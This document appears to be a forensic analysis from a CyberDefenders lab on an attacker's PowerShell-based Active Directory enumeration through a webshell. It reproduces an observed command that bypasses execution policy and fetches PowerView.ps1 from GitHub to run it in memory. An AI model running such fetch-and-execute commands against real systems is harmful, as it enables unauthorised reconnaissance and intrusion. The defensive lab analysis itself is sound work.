# Case 003 — Active Directory Enumeration via PowerShell

**Document Type:** Analysis  
**Case ID:** 003-hr-webshell-ad-enum-lsass-dump-tunnel-smb-exfil  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## Purpose
This document analyzes the attacker's Active Directory enumeration activity conducted after establishing webshell access. It identifies the tooling used, execution method, and network protocol leveraged to gather domain information.

## Data Sources
- PCAP (E-001)
- Wireshark HTTP stream inspection
- Zeek HTTP metadata

All timestamps referenced below are treated as **UTC**.

## PowerShell Execution Observed

Following initial command execution through the webshell, the attacker transitioned to PowerShell-based reconnaissance. Commands were executed directly through the same webshell interface using HTTP POST requests.

### Execution Characteristics
- **Interpreter:** PowerShell
- **Execution Policy:** Bypassed
- **Execution Method:** In-memory invocation inferred from the `IEX (IWR …)` construction; the surviving notes do not record a script write to disk

In-memory execution of this kind is commonly associated with evading host-based detection. That characterisation is general tradecraft commentary, not an observation from this capture.

## Tool Identification

### PowerView.ps1
The PowerShell command retrieved and executed a well-known Active Directory reconnaissance script:

- **Tool Name:** PowerView.ps1
- **Framework:** PowerSploit
- **Source URL:**  
  `hxxps://raw[.]githubusercontent[.]com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1`

The script was downloaded and executed in-memory using `Invoke-WebRequest` and `Invoke-Expression`.

## Observed PowerShell Command Pattern

The following execution pattern was observed within HTTP request parameters:
```
powershell -exec Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Recon/PowerView.ps1' -UseBasicParsing);
Get-Domain"
```

This confirms:
- Remote script retrieval
- Immediate execution without persistence
- Use of PowerView's domain discovery functions

## Domain Information Retrieved

The `Get-Domain` output recorded in the capture contained:

- **Forest:** `ad[.]compliantsecure[.]store`
- **Domain Name:** `ad[.]compliantsecure[.]store`
- **Domain Controller:** `DC01[.]ad[.]compliantsecure[.]store`
- **Domain Mode Level:** 7
- **Executing Context:** `SYSTEM` on `HRWEBSERVER`

`Get-Domain` returned domain and forest information including the domain name, domain controller, functional mode, and FSMO role-owner information. It does not enumerate users, groups, computers, ACLs or trusts, and no such enumeration appears in the surviving notes.

## Network Protocol

**Range-reported protocol:** LDAP

The CyberRange identified LDAP as the protocol used for the directory enumeration. The surviving evidence records PowerView `Get-Domain` output, which is consistent with LDAP-backed enumeration, but no LDAP packet, port 389 traffic or directory query is preserved in the notes. The command execution itself is observed over HTTP.

## Analytical Assessment

The recorded sequence places PowerView domain enumeration before LSASS credential access and the later authenticated SMB activity.

## Impact on Investigation Flow

The recorded `Get-Domain` output identified the domain and its controller.

Q8 refers to three prior commands but does not identify them in the surviving notes; the intervening host-enumeration steps therefore cannot be reconstructed from the surviving record.

Subsequent analysis focuses on **host targeting and SMB-based enumeration** within the internal network.

## Next Investigative Pivot

Following domain enumeration:
- Identify which domain-joined host was targeted next
- Analyze SMB traffic for share discovery
- Track lateral movement attempts

**Next file:**  
`analysis/006-internal-host-targeting-and-smb-discovery.md`
